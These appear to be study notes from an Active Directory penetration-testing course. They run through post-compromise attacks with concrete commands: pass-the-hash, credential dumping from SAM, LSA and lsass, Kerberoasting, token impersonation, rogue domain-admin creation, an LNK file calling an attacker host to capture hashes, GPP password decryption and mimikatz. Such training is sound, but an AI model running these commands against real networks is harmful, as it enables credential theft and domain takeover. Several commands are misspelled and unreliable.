# Introduction
What happens after we get an account?
What can we do with this access?
Let's move horizontally and vertically.
# Pass Attacks Overview
## Overview
Two attacks: `pass the password` and `pass the hash`
This can be performed after dumping SAM using tools such as:
   - metasploit
   - secretsdump.py
```bash
secretsdump.py domain/username:password@ip-address
```
We can do it with the hash or after cracking the password.
We can pass these values around the network for lateral movement.
## Tools and Usages
### crackmapexec
- Getting general help
```bash
crackmapexec --help
```
- Getting help for a specific command
```bash
crackmapexec smb --help
```
- Using a password
```bash
crackmapexec smb ip/CIDR -u user -d domain -p password
```
- Using a hash. Note: We need NTLMv1. v2 cannot be passed around.
```bash
crackmapexec smb ip/CIDR -u user -H hash --local-auth
```
**Examples:**
```bash
# Password
crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
# Hash
crackmapexec smb 10.0.0.0/24 -u administrator -H hash-here --local-auth
```
- Dump the SAM
```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H hash-here --local-auth --sam
```
- Share enumeration
```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H hash-here --local-auth --shares
```
- Dumping LSA (Local Security Authority)
```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H hash-here --local-auth --lsa
```
- Built-in modules
```bash
crackmapexec smb -L
```
- Dumping lsass
```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H hash-here --local-auth -M lsassy
```
   - What is lsass? It is responsible for enforcing security policy in a system. It does store credentials that we can dump.
- Database: It stores all the attempts and results
```bash
cmedb
```
# Dumping and Cracking Hashes
## Dumping hashes with `secretsdump.py`
Using `secretsdump.py`. Can use a password or hash:
```bash
secretsdump.py domain/username:password@ip-address
secretsdump.py username:@ip-address -hashes hash-here
```
Look for SAM hashes, cleartext passwords, etc. The accounts of interest are local administrators and users.
If the passwords are stored in the registry we could see passwords in cleartext.
If the older protocol `wdigest` (older systems: Windows 7, 8, Windows server 8 and 12) is being used, we could see cleartext passwords.
> [!tip] Bash script
> Make a bash onliner to run all the hashes in the `cmedb` database against every IP address we have using `secretsdump.py`.

Workflow and example lateral movement playbook to find a credential for vertical movement.
> [!example] Lateral Movement Playbook
> Find one hash -> crack it -> spray the password -> find new logins -> use `secretsdump.py` on these new login -> get more hashes -> respray the network with new accounts.

## Cracking hashes using `hashcat`
Get the NT portion of the hash to crack it with hashcat.
Save the NT portion to a file.
```bash
hash -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
```
# Kerberoasting
Uses service accounts. We can try this technique any time we compromise a domain user account.
Initiate the workflow by requesting a TGT, so the server can then provide us an encrypted TGS with the services's hash.
- GetUsersSPNs.py
```bash
sudo GetUserSPNs.py domain/username:password -dc-ip ip-here -request
```
Example:
```bash
sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.0.0.3 -request
```
Crack the hash with hashcat.
```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```
# Token Impersonation
## Overview
What are token? Cookies for computers. Temporaries keys.
Types: delegate and impersonate.
- Delegate token: Created when login to a machine or using Remote Desktop.
- Impersonate: "non-interactive" such as attaching a network drive or a domain logon script.
### Examples of weaponization
1. If we can impersonate a domain admin we could add a new user to the machine. We can add that new user to the domain admin group.
```batch
net user /add hawkeye Password1@ /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN
```
2. Run mimikatz to dump hashes from the Domain Controller.
## Using Metasploit
### Incognito tool.
```bash
msfconsole
# Get a basic shell in the machine using psexec
msf > search psexec
msf > set payload windows/x64/meterpreter/reverse_tcp
# Set all the other options and run the command to get a shell
```
After getting a shell with metasploit, load the incognito tool
```bash
meterpreter > load incognito
```
list tokens in the machine
```bash
meterpreter > list_tokens
```
Impersonate the user
```bash
meterpreter > iimpersonate_token MARVEL\\administrator
meterpreter > shell
```
After getting a shell as Domain Admin add a new user and add that user to the domain admin's group as shown in the examples above.
Use `secretsdump.py` with the newly created user to dump the Domain Controller's secrets.
# LNK File Attacks
## Powershell method
Placing a malicious file in a shared folder can lead to some great results
Using powershell to generate a file
Place that file in a file share
```powershell

$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\attacker-ip\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```
Have responder on
```bash
sudo responder -I eth0 -dPv
```
Once the file is triggered, we get a hash
## netexec tool
`netexec` is an updated crackmapexec
Using the Built-in module `slinky`
```bash
netexec smb 10.0.0.0/24 -d marvel.local -u fcastle - Password1 -M slinky -o NAME=test SERVER=attacker-ip
```
# GPP Attacks AKA cPassword Attacks
Old issue, might be patched in new systems, but still good to keep in mind
Group Polict Prefereces allowed administrtors to create policies using embedded credentials.
These credentials were encrypted and placed in a cPassword. The encryption key was accidentally released.
These credentials are found in GPP XML files stored in the SYSVOL.
## Tools
`ggp-decrypt` tool to decrypt the gpp password
```bash
ggp-decrypt encrypted-text-here
```
If we have credentials we can use metasploit. Use the module `smb_enum_gpp`.
```bash
msfconsole
msf > search smb_enum_gpp
msf > run
```
# Mimikatz
This tool gets picked up by every anti-virus, so it needs to be obfuscated
Used to view and steal credentials, generate kerberos tickets, dump credentials in memory, pass the hash, golden ticket, etc.
Download mimikatz in kali linux `gentilkiwi/mimikatz`
Unzip the folder and transfer the files to the victims machine. We could use a python server or another method for the file transfer.
Open the command prompt as admin and run the executable.
See different privileges
```batch
privilege::
```
Set privilege
```batch
privilege::debug
```
sekrulsa module logonPasswords to get credentials
```batch
sekrulsa::logonPasswords
```
# Post-Compromise Attack Strategy
We have an account, now what?
Search for quick wins: Kerberoasting, secretsdump, pass the hash, pass the password.
No quick wins? Dig deep: enumerate (Bloodhound, etc), Where does your account have access?, Old vulnerabilities die hard.

